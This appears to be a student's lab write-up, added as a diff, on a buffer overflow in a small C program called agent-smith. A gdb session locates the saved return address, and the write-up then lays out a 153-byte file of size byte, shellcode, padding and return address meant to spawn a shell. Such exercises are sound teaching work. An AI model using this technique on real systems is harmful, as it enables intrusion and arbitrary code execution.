@@ -1,0 +1,46 @@
+The vulnerability in q3 is another buffer overflow vulnerability. The vulnerability comes from the fact that the user can determine the size of "file" with the first byte of the file. If the user sets the size of the file to be larger than the "msg" buffer, when the file is put into "msg" with fread, the msg buffer will be overrun. Again, by overwriting the return address with the address of malicious code, a user can spawn another shell. First, I find out the size of the "msg" buffer with gdb. 
+
+Breakpoint 1 at 0x804855e: file agent-smith.c, line 23.
+(gdb) r anderson.txt
+Starting program: /home/smith/agent-smith anderson.txt
+
+Breakpoint 1, main (argc=2, argv=0xbffff7f4) at agent-smith.c:23
+23	     if (argc != 2)
+(gdb) s
+26      display(argv[1]);
+(gdb) s
+display (path=0xbffff8f6 "anderson.txt") at agent-smith.c:9
+9	  memset(msg, 0, 128);
+(gdb) i f 0
+Stack frame at 0xbffff740:
+ eip = 0x80484b5 in display (agent-smith.c:9); saved eip 0x804857b
+ called by frame at 0xbffff760
+ source language c.
+ Arglist at 0xbffff738, args: path=0xbffff8f6 "anderson.txt"
+ Locals at 0xbffff738, Previous frame's sp is 0xbffff740
+ Saved registers:
+  ebp at 0xbffff738, eip at 0xbffff73c
+(gdb) x/64 msg
+0xbffff6a8:	1	-1207961288	0	0
+0xbffff6b8:	0	-1208147968	-1073744114	-1073744113
+0xbffff6c8:	1	-1209253223	-1073744113	-1073744114
+0xbffff6d8:	0	-1208008740	-1073743980	0
+0xbffff6e8:	0	-1209667517	134513293	0
+0xbffff6f8:	750006344		1		-1073743650	47
+0xbffff708:	-1073744036		-1208147968	134514064	134513600
+0xbffff718:	0			134513461	-1208146972	5
+0xbffff728:	134520832		134514146	2		-1073743884
+0xbffff738:	-1073744040		134514043	-1073743626	0
+0xbffff748:	134514073		-1208147968	134514064	0
+0xbffff758:	0			-1209772845	2		-1073743884
+0xbffff768:	-1073743872		-1208104872	0		-1073744100
+0xbffff778:	-1073743872		0		134513228	-1208147968
+0xbffff788:	0			0		0		-1966220666
+0xbffff798:	-1115013482		0		0		0
+
+Subtracting the address of eip and the first address used by "msg", I find that the msg buffer is 148 bytes in length. This means my file will be 153 bytes in length, 4 bytes for the return address and 1 byte for the size of the file. My file then consists of:
+1. A byte that represents the size of the file.
+2. 45 bytes of the shell code I want to run.
+3. 103 bytes of meaningless padding.
+4. Return address that will point to start of the shell code.
+The return address will simply be the second address that "msg" uses, since the first byte of msg is the byte representing the size.
